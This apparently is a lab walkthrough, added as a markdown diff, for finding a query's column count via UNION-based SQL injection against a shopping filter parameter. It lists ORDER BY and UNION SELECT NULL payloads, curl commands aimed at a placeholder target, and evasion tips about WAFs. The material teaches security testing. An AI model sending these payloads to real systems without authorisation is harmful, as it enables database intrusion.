@@ -1,0 +1,91 @@
+SQL injection UNION attack, determining the number of columns returned by the query — Practitioner
+
+**Status:** Solved
+
+---
+
+## Goal
+
+Determine how many columns are returned by the original SQL query using UNION-based SQL injection techniques.
+
+---
+
+## Steps (simple & complete)
+
+1. **Find the injection point**
+   - Browse to the shopping application
+   - Click on any product category:
+GET /filter?category=Gifts
+- This parameter is vulnerable to SQL injection
+
+2. **Test for SQL injection**
+- Try basic injection to confirm vulnerability:
+/filter?category=Gifts'
+- You should get an error or unusual behavior
+
+3. **Method 1: Using ORDER BY**
+- Start with ORDER BY 1 and increment:
+Gifts' ORDER BY 1--
+Gifts' ORDER BY 2--
+Gifts' ORDER BY 3--
+Gifts' ORDER BY 4--
+- Keep increasing the number until you get an error
+- If `ORDER BY 3` works but `ORDER BY 4` fails, there are 3 columns
+
+4. **Method 2: Using UNION SELECT with NULL**
+- Start with one NULL and add more:
+Gifts' UNION SELECT NULL--
+Gifts' UNION SELECT NULL,NULL--
+Gifts' UNION SELECT NULL,NULL,NULL--
+- Keep adding NULLs until the query executes without error
+- NULL works with any data type, so it's safe to use
+
+5. **Execute with ORDER BY method**
+```bash
+curl -s "https://TARGET/filter?category=Gifts'+ORDER+BY+1--"
+curl -s "https://TARGET/filter?category=Gifts'+ORDER+BY+2--"
+curl -s "https://TARGET/filter?category=Gifts'+ORDER+BY+3--"
+curl -s "https://TARGET/filter?category=Gifts'+ORDER+BY+4--"
+When you get an error, you've found the limit
+Execute with UNION SELECT method
+curl -s "https://TARGET/filter?category=Gifts'+UNION+SELECT+NULL--"
+curl -s "https://TARGET/filter?category=Gifts'+UNION+SELECT+NULL,NULL--"
+curl -s "https://TARGET/filter?category=Gifts'+UNION+SELECT+NULL,NULL,NULL--"
+When the page loads normally, you've found the correct number
+Verify success
+Once you find the correct number of columns, the lab solves automatically
+The page will display normally without errors
+Example
+Using ORDER BY:
+Gifts' ORDER BY 1--  ✓ (works)
+Gifts' ORDER BY 2--  ✓ (works)
+Gifts' ORDER BY 3--  ✓ (works)
+Gifts' ORDER BY 4--  ✗ (error)
+Result: 3 columns
+Using UNION SELECT:
+Gifts' UNION SELECT NULL--              ✗ (error - not enough columns)
+Gifts' UNION SELECT NULL,NULL--         ✗ (error - not enough columns)
+Gifts' UNION SELECT NULL,NULL,NULL--    ✓ (works - correct number!)
+Result: 3 columns
+Why each method works
+ORDER BY method:
+ORDER BY n sorts results by the nth column
+If you specify a column number that doesn't exist, you get an error
+This tells you the maximum number of columns
+Faster but might be blocked by some WAFs
+UNION SELECT NULL method:
+UNION requires both queries to return the same number of columns
+NULL is compatible with any data type
+If column count doesn't match, you get an error
+More reliable and stealthy
+Why use NULL?
+NULL can be cast to any data type automatically
+Avoids type mismatch errors
+Works across all database systems
+Safe for blind enumeration
+Tips
+Always use -- to comment out the rest of the query
+URL encode special characters when testing in browser
+If one method is blocked, try the other
+Some databases might need FROM dual (Oracle)
+Start with small numbers and work your way up
